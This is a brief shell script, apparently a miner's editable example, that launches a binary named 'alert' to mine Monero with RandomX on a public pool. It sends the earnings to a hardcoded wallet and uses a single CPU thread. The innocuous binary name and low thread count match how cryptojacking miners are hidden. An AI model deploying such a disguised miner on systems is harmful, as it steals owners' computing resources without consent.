#!/bin/sh

#This is an example you can edit and use
#There are numerous parameters you can set, please check Help and Examples folder

./alert --disable-gpu --algorithm randomx --pool xmr.2miners.com:2222 --wallet 42MSX6j3TbsC6umbLRt4vUj9nVsTSms6vQjwaFE7wTYq83yifV7rZXQitWjKQT1XLU9ihg5LKdKtSVJeU9Vxkzqy4zpEQET --cpu-threads 1
